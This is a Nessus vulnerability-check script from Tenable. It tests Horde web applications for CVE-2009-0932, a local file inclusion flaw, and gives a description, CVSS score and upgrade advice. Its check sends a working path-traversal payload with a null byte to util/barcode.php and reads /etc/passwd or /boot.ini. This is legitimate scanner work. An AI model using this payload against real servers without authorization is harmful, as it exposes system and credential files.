#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35554);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-0932");
  script_bugtraq_id(33491);
  script_xref(name:"OSVDB", value:"51887");
  script_xref(name:"Secunia", value:"33695");

  script_name(english:"Horde Horde_Image::factory driver Argument Local File Inclusion");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack." );
 script_set_attribute(attribute:"description", value:
"The version of Horde, Horde Groupware, or Horde Groupware Webmail
Edition installed on the remote host fails to filter input to the
'driver' argument of the 'Horde_Image::factory' method before using it
to include PHP code in 'lib/Horde/Image.php'.  Regardless of PHP's
'register_globals' and 'magic_quotes_gpc' settings, an unauthenticated
attacker can exploit this issue to view arbitrary files or possibly to
execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id. 

Note that this install is also likely affected by a cross-site
scripting issue in the 'services/portal/cloud_search.php' script
although Nessus has not checked for that." );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000482.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000483.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000486.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000487.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000488.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.horde.org/archives/announce/2009/000489.html" );
 script_set_attribute(attribute:"solution", value:
"If using Horde, upgrade to version 3.3.3 / 3.2.4 or later. 

If using Horde Groupware, upgrade to version 1.2.2 / 1.1.5 or later. 

If using Horde Groupware Webmail Edition, upgrade to version 1.2.2 /
1.1.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("horde_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list(files, 'js/addEvent.php');
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['js/addEvent.php'] = "\$Horde: horde/js/addEvent\.php";


# Test an install.
install = get_kb_item(string("www/", port, "/horde"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Loop through files to look for.
  foreach file (files)
  {
    if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
    else traversal = '../../../';

    if (substr(file, strlen(file)-4) == ".php")
      exploit = string(traversal, substr(file, 0, strlen(file)-4-1));
    else
      exploit = string(traversal, file, "%00");

    url = string(
      dir, "/util/barcode.php?",
      "type=", exploit
    );

    res = http_send_recv3(method:"GET", item:url, port:port);
    if (res == NULL) exit(0);

    # There's a problem if we see the expected contents.
    pat = file_pats[file];
    if (egrep(pattern:pat, string:res[2]))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          if ("Call to undefined method PEAR_Error::" >< res[2])
            res[2] = res[2] - strstr(res[2], "<br />");

          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2],
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
